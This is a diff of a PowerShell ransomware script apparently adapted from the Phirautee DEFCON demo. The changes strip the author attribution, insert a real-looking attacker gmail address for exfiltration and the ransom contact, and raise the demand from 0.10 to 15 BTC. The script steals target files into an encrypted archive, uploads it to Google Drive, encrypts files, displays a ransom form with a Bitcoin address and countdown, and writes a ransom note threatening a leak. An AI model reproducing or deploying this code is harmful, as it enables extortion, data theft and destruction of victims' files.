@@ -1,24 +1,3 @@
-<#
-
-                 _____
-              .-" .-. "-.
-            _/ '=(0.0)=' \_
-          /`   .='|m|'=.   `\	Author:Viral Maniar
-          \________________ /	Twiiter: @ManiarViral
-      .--.__///`'-,__~\\\\~`	┌─┐┬ ┬┬┬─┐┌─┐┬ ┬┌┬┐┌─┐┌─┐
-     / /6|__\// a (__)-\\\\	├─┘├─┤│├┬┘├─┤│ │ │ ├┤ ├┤ 
-     \ \/--`((   ._\   ,)))	┴  ┴ ┴┴┴└─┴ ┴└─┘ ┴ └─┘└─┘
-     /  \\  ))\  -==-  (O)(
-    /    )\((((\   .  /)))))
-   /  _.' /  __(`~~~~`)__
-  //"\\,-'-"`   `~~~~\\~~`"-.
- //  /`"              `      `\
-//
-#>
-# RSA 3072 bits RSA Key
-#----------------------------------------------------------------------------------------------------------------------------------------
-# Generate Certificate & Export it to the Temp folder
-#----------------------------------------------------------------------------------------------------------------------------------------
 Write-Host "[+] Mapping network drives..."
 $net = new-object -ComObject WScript.Network
 
@@ -38,7 +17,7 @@ Export-Certificate -Cert $cert -FilePath "C:\temp\cert.cer" | Out-Null
 #----------------------------------------------------------------------------------------------------------------------------------------
 $encodedcert = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\cert.cer"))
 
-Write-Host "Base64 encoded certificate: $encodedcert" -ForegroundColor Green
+Write-Host "Base64 encoded certificate: $encodedcert" -ForegroundColor Blue
 
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Password generator for the "DEFCON 28 DEMO 2020" Certificate
@@ -52,16 +31,16 @@ echo ("$pwd2") > c:/temp/sys.txt
 Install-Module -Name 7Zip4Powershell -RequiredVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
 # Start-Sleep -s 10
 $IV11 = "v9(nnlZl8rz:d)mok*D=+;Th[:}LN;P5C{Dp64|-AX5U"
-Write-Host "[+] Zipping files!" -ForegroundColor Green
+Write-Host "[+] Compressing certificate password for exfil..." -ForegroundColor Green
 Compress-7Zip -Path c:\temp\sys.txt -ArchiveFileName c:\temp\backup.zip -Format Zip -Password "$IV11"
-Write-Host "[+] File zipped!" -ForegroundColor Green
+Write-Host "[+] File c:\temp\backup.zip created..." -ForegroundColor Green
 
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Send certificate password via encrypted zip file to Pokemail e-mail
 #----------------------------------------------------------------------------------------------------------------------------------------
-# $email = "xxxxxxxx@pokemail.net" # Replace $email with your pokemail address
+# $email = "ecoterror443@gmail.com" # Replace $email with your pokemail address
 # $ZipFolder = "c:\temp\backup.zip"
-# $SMTPServer = "smtp.pokemail.net"
+# $SMTPServer = "smtp.gmail.net"
 # $Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
 # $From = $email
 # $To = $email
@@ -76,9 +55,9 @@ Write-Host "[+] File zipped!" -ForegroundColor Green
 # $Msg.Dispose()
 # $Mailer.Dispose()
 
-Write-Host "[+] Email Sent!" -ForegroundColor Green
+Write-Host "[+] Certificate password delivered via email..." -ForegroundColor Green
 # Start-Sleep -s 2
-Write-Host "[-] Deleting files" -ForegroundColor Red
+Write-Host "[-] Deleting password file and archive..." -ForegroundColor Red
 Remove-Item c:\temp\sys.txt
 Remove-Item c:\temp\backup.zip
 
@@ -89,16 +68,16 @@ Remove-Item c:\temp\backup.zip
 $pwd1 = [system.web.security.membership]::GeneratePassword(30,15)
 echo ("$pwd1") > c:/temp/sys1.txt
 $IV1 = "D^Z@e8507=>YS#)qj;zgBeZWb!0-Tp(hBEAi:2.S5G/"
-Write-Host "[+] Zipping files!" -ForegroundColor Green
+Write-Host "[+] Compressing zip password for exfil..." -ForegroundColor Green
 Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1.zip -Format Zip -Password "$IV1"
-Write-Host "[+] File zipped!" -ForegroundColor Green
+Write-Host "[+] File C:\temp\backup1.zip created..." -ForegroundColor Green
 
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Send password for files to your e-mail
 #----------------------------------------------------------------------------------------------------------------------------------------
-# $email1 = "xxxxxxxxxxxxxxxxx@pokemail.net" # Replace $email1 with your pokemail address
+# $email1 = "ecoterror443@gmail.com" # Replace $email1 with your pokemail address
 # $ZipFolder1 = "c:\temp\backup1.zip"
-# $SMTPServer = "smtp.pokemail.net"
+# $SMTPServer = "smtp.gmail.com"
 # $Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
 # $From = $email1
 # $To = $email1
@@ -113,9 +92,9 @@ Write-Host "[+] File zipped!" -ForegroundColor Green
 # $Msg.Dispose()
 # $Mailer.Dispose()
 
-Write-Host "[+] Email Sent!" -ForegroundColor Green
+Write-Host "[+] Certificate password delivered via email..." -ForegroundColor Green
 # Start-Sleep -s 2
-Write-Host "[-] Deleting files" -ForegroundColor Red
+Write-Host "[-] Deleting password file and archive..." -ForegroundColor Red
 Remove-Item c:\temp\sys1.txt
 Remove-Item c:\temp\backup1.zip
 
@@ -147,16 +126,16 @@ For($i = 1; $i -le $files.count; $i++)
 { Write-Progress -Activity "“Collecting files” -status “Finding file $i”" -percentComplete ($i / $files.count*100)}
 
 $files | Select name
-Write-Host "[+] Files copied" -ForegroundColor Green
+Write-Host "[+] Target files copied to temp location..." -ForegroundColor Green
 Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal.zip -Format Zip -Password "$pwd1"
 
 # Start-Sleep -s 5
-Write-Host "[+] Files zipped" -ForegroundColor Green
+Write-Host "[+] Target files compressed to encrypted archive..." -ForegroundColor Green
 #$del = Remove-Item $Destination -Force -Recurse
-Write-Host "[+] Uploading Large Files to G-Drive" -ForegroundColor Green
+Write-Host "[+] Uploading archive to Google drive..." -ForegroundColor Green
 # Start-Sleep -s 5
 $del = Remove-Item $Destination -Force -Recurse
-Write-Host "[-] Uploading Large Files Deleted" -ForegroundColor Red
+Write-Host "[-] Removing archive after upload..." -ForegroundColor Red
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Encrypted Large files to be send to G-Drive
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -226,8 +205,8 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 # Start-Sleep -s 10
 Remove-Item c:\temp\steal.zip
 # Start-Sleep -s 5
-Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
-Write-Host "[+] Init Phiratee..." -ForegroundColor Green
+Write-Host "[-] Archive deleted..." -ForegroundColor Red
+Write-Host "[+] Beginning target file encryption..." -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Encrypt files via Phirautee
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -271,13 +250,13 @@ $alert = "https://raw.githubusercontent.com/Viralmaniar/Phirautee/master/defcon.
 Invoke-WebRequest -Uri $alert -OutFile "C:/temp/defcon.jpg"
 # Start-Sleep -s 2
 
-Write-Host "[+] Phiratee Deployed Successfully..." -ForegroundColor Green
+Write-Host "[+] Target files encrypted..." -ForegroundColor Green
 $encodedcert =  [IO.File]::WriteAllBytes("c:/windows/temp/x.cer", [Convert]::FromBase64String($encodedcert))
-#echo (Protect-CmsMessage -Content $pwd -To "/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt
+#echo (Protect-CmsMessage -Content $pwd -To "c:/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt
 
 # Start-Sleep -s 10
 #remove-variable pwd
-Write-Host "[+] Intiating UI..." -ForegroundColor Green
+Write-Host "[+] Intiating ransom UI..." -ForegroundColor Green
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 [void] [System.Windows.Forms.Application]::EnableVisualStyles() 
@@ -343,7 +322,7 @@ $Form.Controls.Add($Okbutton)
 
 $btc_addr = '1HF16jtnSCuRvAThJ7p99QeroAnBkiR4Yb'      # Replace this with your address
 $Label1 = New-Object System.Windows.Forms.Label 
-$Label1.Text = "Send 0.10 BTC to this account: $btc_addr" 
+$Label1.Text = "Send 15 BTC to this account: $btc_addr" 
 $Label1.AutoSize = $true 
 $Label1.Location = New-Object System.Drawing.Size(50,550) 
 $Font1 = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
@@ -352,7 +331,7 @@ $Form.Controls.Add($Label1)
 
 $objTextBox1 = New-Object System.Windows.Forms.TextBox 
 $objTextBox1.Multiline = $True;
-$objTextBox1.Text = "We have encrypted your important files. For now you cannot access these files. Encrypted files have been modified with an extension ""phirautee"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 0.10 BTC these files will be leaked online. The faster you contact us at XXXX@XXXXXXXX.XXX with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read Phirautee.txt file on the desktop for further information."
+$objTextBox1.Text = "We have encrypted your important files. For now you cannot access these files. Encrypted files have been modified with an extension ""encrypted"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 15 BTC these files will be leaked online. The faster you contact us at ecoterror443@gmail.com with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read ransom.txt file on the desktop for further information."
 $objTextBox1.AutoSize = $true 
 $objTextBox1.Location = New-Object System.Drawing.Size(50,650)
 $objTextBox1.Size = New-Object System.Drawing.Size(850,180)
@@ -380,13 +359,13 @@ while ($delay -ge 0)
 		 $warningfont = New-Object System.Drawing.Font("Times New Roman",$fontsize,[System.Drawing.FontStyle]([System.Drawing.FontStyle]::Bold))
 		 $Counter_Label.Font = $warningfont
 	  }
-Start-Sleep 1
+# Start-Sleep 1
 $delay -= 1	  
 }
 $Form.Close()
 $background = "https://raw.githubusercontent.com/Viralmaniar/Phirautee/master/PhirauteeBackground-3.jpg"
 Invoke-WebRequest -Uri $background -OutFile "c:/users/$env:USERNAME/PhirauteeBackground-3.jpg"
-Start-Sleep -s 2
+# Start-Sleep -s 2
 <#
 #Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name WallPaper -value ''
 New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImageStatus" -Value "1" -PropertyType DWORD -Force | Out-Null
@@ -401,7 +380,7 @@ rundll32.exe user32.dll, UpdatePerUserSystemParameters, 1 , $False
 
 Stop-Process -ProcessName explorer
 
-echo "We have encrypted your important files. For now, you cannot access these files. Encrypted files have been modified with an extension ""encrypted"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 0.10 BTC these files will be leaked online. The faster you contact us at XXXX@XXXXXXXX.XXX with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read Phirautee.txt file on the desktop for further information. This ransomware encrypts all the files of the hard drive. To decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. If you do not pay the money your sensitive data will be leaked online." > c:/users/$env:USERNAME/desktop/Phirautee.txt
+echo "We have encrypted your important files. For now, you cannot access these files. Encrypted files have been modified with an extension ""encrypted"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 15 BTC these files will be leaked online. The faster you contact us at ecoterror443@gmail.com with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read Phirautee.txt file on the desktop for further information. This ransomware encrypts all the files of the hard drive. To decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. If you do not pay the money your sensitive data will be leaked online." > c:/users/$env:USERNAME/desktop/Phirautee.txt
 #$Form.ShowDialog()
 #$Form.Focus()
 Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.subject -eq "CN=Project Red Team III" } | Remove-Item
